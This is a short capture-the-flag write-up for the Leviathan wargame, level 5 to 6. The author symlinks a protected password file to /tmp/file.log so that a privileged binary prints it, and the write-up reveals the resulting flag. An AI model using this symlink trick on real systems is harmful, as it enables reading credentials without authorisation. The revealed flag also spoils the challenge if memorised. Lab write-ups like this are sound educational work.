## 5 -> 6

### Writeup

I started by running the provided binary "leviathan5", and found that it needs a file "/tmp/file.log" to exist before it can actually run. So I ran 'echo a > /tmp/file.log && ./leviathan5', and it printed the contents of the file to the shell. This showed that the purpose of the binary was to cat /tmp/file.log.

```
leviathan5@leviathan:~$ ./leviathan5
Cannot find /tmp/file.log
leviathan5@leviathan:~$ echo a > /tmp/file.log && ./leviathan5
a
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
JRGj9iWNOb
leviathan5@leviathan:~$ []
```

Thinking back to Leviathan 2->3, we were able to trick user programs into printing the contents of forbidden files using symbolic links, so I created a symbolic link from /etc/leviathan_pass/leviathan6 to /tmp/file.log, and this worked! The binary printed the file's contents, revealing the flag to be.

<details>
<summary>Flag</summary>
JRGj9iWNOb
</details>